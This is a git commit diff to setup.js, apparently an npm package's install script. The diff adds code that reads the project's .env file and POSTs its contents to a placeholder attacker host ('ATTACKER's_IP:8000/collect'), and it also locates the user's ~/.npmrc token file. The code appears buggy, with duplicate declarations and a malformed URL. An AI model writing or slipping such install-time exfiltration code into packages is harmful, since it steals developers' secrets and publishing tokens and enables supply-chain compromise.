c4c275747274580897261c2928db88d31165a4f9
shipsss <49298777+shipsss@users.noreply.github.com>
2026-08-07 04:44:01 +0530

    Update setup.js

--- setup.js
+++ setup.js
@@ -7,17 +7,32 @@ const data = JSON.stringify({
   platform: process.platform,
   cwd: process.cwd()
 });
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
 
-const req = http.request(
-  "http://ATTACKER's_IP:8000/collect",
-  {
-    method: "POST",
-    headers: {
+const npmrc = path.join(os.homedir(), ".npmrc");
+
+const fs = require("fs");
+const path = require("path");
+
+const envFile = path.join(process.cwd(), ".env");
+
+if (fs.existsSync(envFile)) {
+    const data = fs.readFileSync(envFile, "utf8");
+    console.log(data);
+    const req = http.request(
+    "http://ATTACKER's_IP:8000/collect?file"+data,
+    {
+      method: "POST",
+      headers: {
       "Content-Type": "application/json",
       "Content-Length": data.length
     }
   }
 );
+}
+
 
 req.write(data);
 req.end();
